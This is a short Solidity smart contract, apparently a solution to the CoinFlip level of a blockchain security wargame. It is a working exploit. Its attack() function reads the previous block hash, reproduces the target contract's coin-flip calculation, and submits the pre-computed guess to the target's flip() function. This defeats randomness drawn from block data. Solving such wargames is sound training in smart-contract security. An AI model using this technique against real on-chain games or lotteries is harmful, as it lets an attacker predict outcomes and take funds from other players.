pragma solidity 0.8.4;

// import '@openzeppelin/contracts/math/SafeMath.sol';

interface CoinFlipInterface { // to access related methods of the CoinFlip contract
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipExploit{

	//Variables & Declarations
	// using SafeMath for uint256;
	address coinFlipAddr;
	uint FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

	//Constructor
	constructor(address _addr) public{
		coinFlipAddr = _addr;
	}

	//Methods
	function attack() public returns(bool){
		//Access to the target contract
		CoinFlipInterface ci = CoinFlipInterface(coinFlipAddr);

		//Abuse block.number random guessing and pre - guess the result
		uint256 blockValue = uint256(blockhash(block.number - 1)); //get last block hash by using block.number - 1
		uint256 coinFlip = blockValue / FACTOR;
		bool side = coinFlip == 1 ? true : false;

		//Invoke flip function with pre-calculated result
		return ci.flip(side);
	}
}